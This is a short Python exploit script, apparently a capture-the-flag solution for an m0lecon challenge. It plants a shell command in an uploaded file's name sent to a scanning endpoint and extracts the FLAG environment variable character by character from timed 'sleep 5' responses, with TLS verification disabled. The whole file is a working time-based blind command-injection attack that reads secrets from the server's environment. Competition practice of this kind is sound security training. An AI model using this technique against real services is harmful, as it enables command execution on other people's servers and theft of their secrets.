#!/usr/bin/env python3
import requests
import time
import string
import urllib3
urllib3.disable_warnings()

url = 'https://f85be3d4-5360-44bb-9985-ea310d384645.offsec.m0lecon.it/scan' #base URL
s = requests.Session()
charset = string.ascii_letters + string.digits + "{}_!-@"
flag = ""

for i in range(50):
    found = False
    for char in charset:
        payload = f'prova.py; b=$(printenv FLAG | cut -c{i+1}); [ $b = {char} ] && sleep 5'
        files = {'specimen': (payload,b'test','text/x-python')}
        start = time.time()
        resp = s.post(url,files=files,verify=False)
        inter = time.time() - start
        if inter >= 4: 
            flag += char
            print(f"Flag: {flag}")
            found = True
            break
    if not found:
        break 

print(f"Final flag: {flag}")